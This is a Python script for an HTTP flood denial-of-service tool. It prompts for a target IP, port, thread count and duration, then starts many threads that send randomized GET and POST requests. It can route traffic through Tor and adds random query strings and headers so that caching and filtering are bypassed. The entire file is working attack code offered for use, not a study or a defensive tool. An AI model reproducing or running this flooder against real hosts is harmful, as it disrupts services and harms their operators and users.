import sys,socket,threading,time,socks,random

from payloads import *
if  sys.version_info < (3,0):
 input=raw_input

class http_spam:
 def __init__(self,u,p=80,threads_daemon=False,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  self.paths=paths
  self.post_min=post_min
  self.post_max=post_max
  self.post_field_max=post_field_max
  self.post_field_min=post_field_min
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
      break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout=(self.timeout)
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     for fg in range(random.randint(self.round_min,self.round_max)):
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if stop==True: 
       break
      pa=random.choice(self.paths)#bypassing cache engine
      q=''
      for i in range(random.randint(2,5)):
       q+=random.choice(lis)+str(random.randint(1,100000))
      p=''
      for i in range(random.randint(2,5)):
       p+=random.choice(lis)+str(random.randint(1,100000))
      if '?' in pa:
       jo='&'
      else:
       jo='?' 
      pa+=jo+q+"="+p
      #setting random headers
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
        ed+=', '
        ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
       m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
      else:
       req="POST"
       k=''
       for _ in range(random.randint(self.post_field_min,self.post_field_max)):
        k+=random.choice(lis)
       j=''
       for x in range(random.randint(self.post_min,self.post_max)):
        j+=random.choice(lis)
       par =k+'='+j
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
      try:
       if self.stop==True:
         break
       s.send(m.encode('utf-8'))
       self.counter+=1
       if self.logs==True:
        sys.stdout.write("\rRequest: {} | Type: {} | Bytes: {}   ".format(self.counter,req,len(m)))
        sys.stdout.flush()
        #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
      except:
       break
      time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
   self.kill()
  except:
   pass
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]  
  self.reset()
  return a

ip=input("TARGET IP : ")
p=int(input("PORT : "))
th=int(input("THREADS : "))
ti=int(input("TIMEOUT : "))
dur=int(input("DURATION (in seconds) : "))

http_spam(ip,p=p,duration=dur,threads=th,timeout=ti,interval=0,logs=True)